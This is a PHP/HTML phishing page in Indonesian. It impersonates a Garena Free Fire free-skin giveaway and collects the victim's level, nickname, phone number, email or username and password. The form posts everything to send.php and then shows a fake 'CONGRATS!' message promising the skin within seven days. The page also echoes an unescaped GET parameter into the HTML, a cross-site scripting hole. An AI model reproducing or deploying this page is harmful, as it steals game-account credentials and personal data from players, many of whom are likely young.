<?php
// Menentukan jenis login (Google atau Facebook)
$login_type = isset($_GET['type']) ? $_GET['type'] : 'google';
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>Form Data</title>
    <style>
        body { 
            text-align: center; 
            font-family: Arial, sans-serif; 
            background: url('https://images.alphacoders.com/133/1331442.jpeg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            padding: 50px;
        }
        .form-container {
            background: rgba(0, 0, 0, 0.8);
            padding: 25px;
            border-radius: 8px;
            width: 350px;
            max-width: 90%;
            margin: auto;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.5);
            text-align: left;
        }
        .form-container h2 {
            text-align: center;
            margin-bottom: 15px;
            font-size: 22px;
        }
        .form-container label {
            font-weight: bold;
            display: block;
            margin: 10px 0 5px;
            font-size: 14px;
        }
        .form-container input {
            width: calc(100% - 20px);
            padding: 10px;
            border-radius: 5px;
            border: none;
            background: rgba(255, 255, 255, 0.15);
            color: white;
            font-size: 16px;
            display: block;
            margin: 5px auto;
            outline: none;
            transition: all 0.3s ease-in-out;
        }
        .form-container input:focus {
            background: rgba(255, 255, 255, 0.25);
        }
        .form-container input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        .submit-btn {
            display: block;
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: transparent;
            color: white;
            border: 2px solid white;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
        }
        .submit-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        .loading, .success-message {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .success-message h2 {
            font-size: 30px;
            font-weight: bold;
            color: gold;
            animation: blink 1s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 1; }
            to { opacity: 0.5; }
        }
    </style>
</head>
<body>

<img src="https://upload.wikimedia.org/wikipedia/en/c/c5/Logo_of_Garena_Free_Fire.png" 
         alt="Free Fire Logo" class="logo" 
         style="width: 350px; display: block; margin: 20px auto; max-width: 90%;">

    <div class="form-container" id="form-container">
        <h2>Silakan Lengkapi Data</h2>
        <form id="myForm">
            <input type="hidden" name="login_type" value="<?php echo $login_type; ?>">

            <label>Level:</label>
            <input type="text" name="level" placeholder="Masukkan Level" required>

            <label>Nickname:</label>
            <input type="text" name="nickname" placeholder="Masukkan Nickname" required>

            <label>No HP:</label>
            <input type="text" name="phone" placeholder="Masukkan No HP" required>

            <label>Username/Email:</label>
            <input type="text" name="email" placeholder="Masukkan Username atau Email" required>

            <label>Password:</label>
            <input type="password" name="password" placeholder="Masukkan Password" required>

            <button type="submit" class="submit-btn">Kirim</button>
        </form>
    </div>

    <div class="loading" id="loading">
        <img src="https://i.gifer.com/YCZH.gif" alt="Loading..." width="80">
        <p>Sedang Diproses...</p>
    </div>

    <div class="success-message" id="success-message">
        <h2>🎉 CONGRATS! 🎉</h2>
        <p>Skin Akan Dikirim Dalam Jangka Waktu 7 Hari!</p>
    </div>

    <script>
        document.getElementById("myForm").addEventListener("submit", function(event) {
            event.preventDefault();
            let formData = new FormData(this);

            document.getElementById("form-container").style.display = "none";
            document.getElementById("loading").style.display = "block";

            fetch("send.php", {
                method: "POST",
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("loading").style.display = "none";
                document.getElementById("success-message").style.display = "block";
            })
            .catch(error => {
                console.error("Error:", error);
                alert("Terjadi kesalahan, coba lagi!");
            });
        });
    </script>

</body>
</html>
